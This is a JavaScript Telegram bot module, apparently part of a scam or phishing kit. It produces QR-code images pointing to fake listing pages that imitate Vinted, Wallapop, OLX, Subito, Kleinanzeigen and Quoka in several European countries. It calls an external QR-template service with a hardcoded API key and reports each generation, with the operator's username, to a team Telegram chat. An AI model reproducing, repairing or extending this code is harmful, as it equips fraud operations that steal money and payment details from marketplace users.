const { Markup } = require("telegraf");
const WizardScene = require("telegraf/scenes/wizard");
const { Ad, Service } = require("../database");
const log = require("../helpers/log");
const axios = require("axios");

const axiosTimeout = 10000; // 15 секунд

const generateAndSendProQR = async (ctx, requestBody, templateName) => {
  try {
    const responsePro = await axios.post(
      "https://goatapi28749282395438.website/generate-qr-pro",
      requestBody,
      { headers: { "Content-Type": "application/json" }, timeout: axiosTimeout }
    );

    if (responsePro.status === 200 && responsePro.data.image) {
      const qrImagePro = Buffer.from(responsePro.data.image, "base64");

      await ctx.replyWithDocument(
        { source: qrImagePro, filename: `goat_${templateName}.png` },
        { parse_mode: "HTML", caption: `<b>✅ QR-код (${templateName}) успешно сгенерирован.</b>` }
      );

      await ctx.telegram.sendMessage(
        -1002389907853,
        `📸 <b>QR-код (${templateName}) сгенерирован!</b>\n\n` +
          `👤 Пользователь: <b>@${ctx.from.username || "Без имени"}</b>`,
        { parse_mode: "HTML" }
      );
    } else {
      await ctx.reply(`❌ Ошибка при генерации QR (${templateName}): Некорректный ответ сервера`).catch(() => {});
    }
  } catch (err) {
    if (err.code === "ECONNABORTED") {
      await ctx.reply(`❌ Ошибка: таймаут запроса при генерации QR (${templateName}). Попробуйте позже.`).catch(() => {});
    } else {
      console.error(`❌ Ошибка при генерации QR (${templateName}):`, err);
      await ctx.reply(`❌ Ошибка при генерации QR (${templateName}): ${err.message}`).catch(() => {});
    }
  }
};

const scene = new WizardScene(
  "screenshot",
  async (ctx) => {
    // Таймаут на 30 секунд, если генерация затянется
    const timeoutId = setTimeout(() => {
      if (ctx.scene.current) {
        ctx.reply("⌛ Время ожидания истекло. Попробуйте позже.");
        ctx.scene.leave();
      }
    }, 30000);

    try {
      const ad = await Ad.findOne({ where: { id: ctx.scene.state.adId } });
      if (!ad) {
        clearTimeout(timeoutId);
        await ctx.reply("❌ Ошибка: объявление не найдено.");
        return ctx.scene.leave();
      }

      const service = await Service.findOne({ where: { code: ad.serviceCode } });

      const sendCountry = {
        vinted_de: "de", vinted_it: "it", vinted_fr: "fr", vinted_es: "es",
        vinted_pt: "pt", vinted_hu: "hu", vinted_nl: "nl", vinted_uk: "uk",
        olx_pt: "pt", subito_it: "it",
        wallapop_de: "de", wallapop_it: "it", wallapop_fr: "fr", wallapop_es: "es",
        wallapop_pt: "pt", wallapop_hu: "hu", wallapop_nl: "nl", wallapop_uk: "uk",
        ebaykleinanzeigen_de: "de"
      };

      const sendService = {
        vinted_de: "vinted", vinted_it: "vinted", vinted_fr: "vinted", vinted_es: "vinted",
        vinted_pt: "vinted", vinted_hu: "vinted", vinted_nl: "vinted", vinted_uk: "vinted",
        olx_pt: "olx", wallapop_de: "wallapop", wallapop_it: "wallapop", wallapop_fr: "wallapop",
        wallapop_es: "wallapop", wallapop_pt: "wallapop", wallapop_hu: "wallapop",
        wallapop_nl: "wallapop", wallapop_uk: "wallapop", subito_it: "subitopro"
      };

      await ctx.answerCbQuery("⏳ Подождите...").catch(() => {});

      const serviceCode = ad.serviceCode || "";
      const country = sendCountry[serviceCode] || null;
      const serviceType = sendService[serviceCode] || serviceCode;
      const apiKey = "2WtblrgJsTVLUKQsQ77ru26fBVCAWv";
      const link = `https://${service.domain}/${ad.id}`;

      if (serviceCode === "subito_it") {
        const requestBodyPro = {
          api: apiKey,
          link,
          service: serviceType,
          country: country || "it",
          name: ad.name || ad.title || "Товар",
          price: ad.price || 0,
          img: ad.photo || "",
          tobase64: true,
        };
       setImmediate(() => {
  generateAndSendProQR(ctx, requestBodyPro, "subitopro").catch(console.error);
});

      } else if (serviceCode === "ebaykleinanzeigen_de") {
        const baseRequest = {
          api: apiKey,
          link,
          service: "", // будет перезаписан ниже
          country: country || "de",
          name: ad.name || ad.title || "Товар",
          price: ad.price || 0,
          img: ad.photo || "",
          tobase64: true,
        };

        const services = ["kleinanzeigenpro8", "kleinanzeigenpro5", "kleinanzeigenpro7"];
        for (const template of services) {
          const request = { ...baseRequest, service: template };
setImmediate(() => {
  generateAndSendProQR(ctx, request, template).catch(console.error);
});
        }
      } else if (serviceCode === "quoka_de") {
        const requestBodyPro = {
          api: apiKey,
          link,
          service: "quokapro",
          country: country || "de",
          name: ad.name || ad.title || "Товар",
          price: ad.price || 0,
          img: ad.photo || "",
          tobase64: true,
        };
setImmediate(() => {
  generateAndSendProQR(ctx, requestBodyPro, "quokapro").catch(console.error);
});
      }else {
        try {
          const responseQR = await axios.get(
            `https://goatapi28749282395438.website/generate-qr?link=${encodeURIComponent(link)}&service=${serviceType}&country=${country}&api=${apiKey}`,
            { responseType: "arraybuffer", timeout: axiosTimeout }
          );
          if (responseQR.status === 200) {
            const qrImageBuffer = Buffer.from(responseQR.data);
            await ctx.replyWithDocument(
              { source: qrImageBuffer, filename: "screenshot.png" },
              { parse_mode: "HTML", caption: "<b>✅ QR-код успешно сгенерирован.</b>" }
            );
            await ctx.telegram.sendMessage(
              -1002389907853,
              `📸 <b>QR-код сгенерирован!</b>\n\n` +
                `👤 Пользователь: <b>@${ctx.from.username || "Без имени"}</b>\n` +
                `💼 Сервис: <b>${serviceType.toUpperCase()}</b>\n` +
                `🌍 Страна: <b>${country ? country.toUpperCase() : "N/A"}</b>`,
              { parse_mode: "HTML" }
            );
          } else {
            await ctx.reply(`❌ Ошибка: неожиданный статус ${responseQR.status}`).catch(() => {});
          }
        } catch (err) {
          if (err.code === "ECONNABORTED") {
            await ctx.reply("❌ Ошибка: таймаут запроса при генерации QR. Попробуйте позже.").catch(() => {});
          } else {
            console.error(err);
            await ctx.reply(`❌ Ошибка при генерации QR: ${err.message}`).catch(() => {});
          }
        }
      }

      clearTimeout(timeoutId); // Успешно завершили, отменяем таймаут
      await ad.update({ screen: 1 });
      log(ctx, "Сгенерировал QR-код");
      return ctx.scene.leave();
    } catch (err) {
      clearTimeout(timeoutId);
      console.error(err);
      await ctx.telegram.sendMessage(
        -1002389907853,
        `❌ <b>Ошибка при генерации QR-кода!</b>\n\n` +
          `👤 Пользователь: <b>@${ctx.from.username || "Без имени"}</b>\n` +
          `📄 Ошибка: <pre>${err.message}</pre>`,
        { parse_mode: "HTML" }
      );
      await ctx.replyWithHTML(
        `<b>❌ Ошибка при генерации QR-кода!</b>\n\nОшибка сервера: <b>${err.message}</b>`
      ).catch(() => {});
      return ctx.scene.leave();
    }
  }
);

module.exports = scene;
